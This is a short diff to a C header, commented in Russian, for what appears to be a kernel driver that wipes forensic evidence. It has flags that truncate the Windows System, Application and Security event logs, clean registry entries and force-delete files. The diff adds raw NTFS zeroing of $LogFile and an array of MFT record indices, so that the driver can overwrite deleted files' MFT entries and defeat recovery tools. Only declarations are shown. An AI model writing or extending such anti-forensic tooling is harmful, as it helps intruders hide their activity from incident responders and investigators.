@@ -20,6 +20,7 @@
 #define SC_DO_EVENTLOG  (1u << 1)  // force-truncate System/Application/Security .evtx
 #define SC_DO_REGISTRY  (1u << 2)  // реестр (HKLM + HKCU через user_sid)
 #define SC_DO_FILES     (1u << 3)  // force-delete список file_paths[]
+#define SC_DO_RAWNTFS   (1u << 4)  // raw NTFS: zero $LogFile + освобождённые MFT-записи (BSOD-риск, валидируется)
 #define SC_DO_ALL       0xFu
 
 #define SC_MAX_FILES    32
@@ -42,6 +43,11 @@ typedef struct _CleanRequest {
     // только удаляет — активность удаления не светится как юзермод-операция).
     unsigned long file_count;
     wchar_t  file_paths[SC_MAX_FILES][SC_PATH_LEN];
+    // MFT record index каждого файла (параллельно file_paths), захваченный
+    // юзермодом через FSCTL_READ_FILE_USN_DATA ДО удаления. 0 = неизвестно.
+    // Драйвер затирает эти записи в $MFT после удаления файлов — имя удалённого
+    // файла не лингерит в MFT для VortexMFTPlus/Recovery.
+    unsigned long long mft_indices[SC_MAX_FILES];
 } CleanRequest;
 #pragma pack(pop)
 
